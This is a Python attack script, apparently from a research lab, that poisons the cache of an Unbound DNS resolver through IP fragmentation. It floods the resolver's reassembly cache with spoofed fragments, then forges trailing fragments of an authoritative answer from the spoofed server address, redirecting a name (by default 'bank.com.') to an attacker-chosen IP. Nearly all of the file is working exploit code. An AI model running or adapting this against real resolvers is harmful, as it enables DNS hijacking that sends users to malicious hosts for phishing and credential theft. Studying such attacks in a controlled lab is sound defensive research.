#!/usr/bin/env python3
"""Occupancy fragments plus notify-driven poison tails for Unbound E5."""
from __future__ import annotations

import argparse
import json
import os
import random
import socket
import struct
import time

from dnslib import A, DNSHeader, DNSRecord, QTYPE, RR, DNSQuestion
from scapy.all import IP, Raw, send  # type: ignore

RESOLVER_IP = os.getenv("RESOLVER_IP", "10.80.0.53")
AUTH_IP = os.getenv("AUTH_IP", "10.80.0.100")
OCC_SRC = os.getenv("OCCUPANCY_SRC", "10.80.0.200")
POISON_IP = os.getenv("POISON_IP", "6.6.6.6")
FRAGSIZE = int(os.getenv("FRAGSIZE", "40"))
IPID_SPACE = int(os.getenv("IPID_SPACE", "2048"))
NOTIFY_PORT = int(os.getenv("NOTIFY_PORT", "9999"))


def udp_payload(dport: int, body: bytes) -> bytes:
    return struct.pack("!HHHH", 53, dport, 8 + len(body), 0) + body


def ip_fragments(src: str, dst: str, ipid: int, payload: bytes):
    size = max(8, (FRAGSIZE // 8) * 8)
    offset = 0
    packets = []
    while offset < len(payload):
        chunk = payload[offset : offset + size]
        mf = 1 if offset + size < len(payload) else 0
        packets.append(
            IP(src=src, dst=dst, id=ipid, ttl=64, proto=17, flags=mf, frag=offset // 8) / Raw(chunk)
        )
        offset += size
    return packets


def poison_body(dns_id: int, qname: str) -> bytes:
    header = DNSHeader(id=dns_id, qr=1, aa=1, ra=0, rd=0)
    response = DNSRecord(header, q=DNSQuestion(qname, QTYPE.A))
    response.add_answer(RR(qname, QTYPE.A, rdata=A(POISON_IP), ttl=30))
    return bytes(response.pack())


def occupancy_packet_pair(ipid: int):
    payload = udp_payload(9, b"OCCUPANCY" + b"O" * 40)
    return ip_fragments(OCC_SRC, RESOLVER_IP, ipid, payload)


def ipid_gen(mode: str, space: int, fixed: int, rng: random.Random):
    while True:
        if mode == "fixed":
            yield fixed
        elif mode == "sweep":
            for value in range(space):
                yield value
        else:
            yield rng.randrange(max(1, space))


def run_occupancy(args: argparse.Namespace) -> None:
    rng = random.Random(args.seed)
    gen = ipid_gen(args.ipid_mode, args.ipid_space, args.fixed_ipid, rng)
    print(
        f"[sender] occupancy mode={args.mode} ipid={args.ipid_mode} rate={args.rate_pps} src={OCC_SRC}",
        flush=True,
    )
    if args.mode == "flood":
        while True:
            batch = []
            for _ in range(min(64, args.ipid_space)):
                batch.extend(occupancy_packet_pair(next(gen)))
            send(batch, verbose=0)
            time.sleep(0.02)
        return
    interval = 1.0 / max(0.1, args.rate_pps)
    while True:
        started = time.perf_counter()
        send(occupancy_packet_pair(next(gen)), verbose=0)
        delay = interval - (time.perf_counter() - started)
        if delay > 0:
            time.sleep(delay)


def run_notify_poison() -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", NOTIFY_PORT))
    print(f"[sender] notify-poison listening on UDP {NOTIFY_PORT}", flush=True)
    while True:
        payload, _addr = sock.recvfrom(4096)
        try:
            info = json.loads(payload.decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError):
            continue
        qname = str(info.get("qname") or "bank.com.")
        body = poison_body(int(info["dns_id"]), qname)
        want = int(info.get("dns_len") or 0)
        if want and len(body) < want:
            body = body + (b"\x00" * (want - len(body)))
        elif want and len(body) > want:
            body = body[:want]
        frags = ip_fragments(AUTH_IP, RESOLVER_IP, int(info["ipid"]), udp_payload(int(info["dport"]), body))
        if len(frags) > 1:
            send(frags[1:], verbose=0)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--role", choices=("occupancy", "notify-poison"), default="occupancy")
    parser.add_argument("--mode", choices=("rate", "flood"), default="rate")
    parser.add_argument("--ipid-mode", choices=("random", "fixed", "sweep"), default="random")
    parser.add_argument("--rate-pps", type=float, default=12.0)
    parser.add_argument("--ipid-space", type=int, default=IPID_SPACE)
    parser.add_argument("--fixed-ipid", type=int, default=777)
    parser.add_argument("--seed", type=int, default=None)
    args = parser.parse_args()
    if args.role == "notify-poison":
        run_notify_poison()
        return
    run_occupancy(args)


if __name__ == "__main__":
    main()
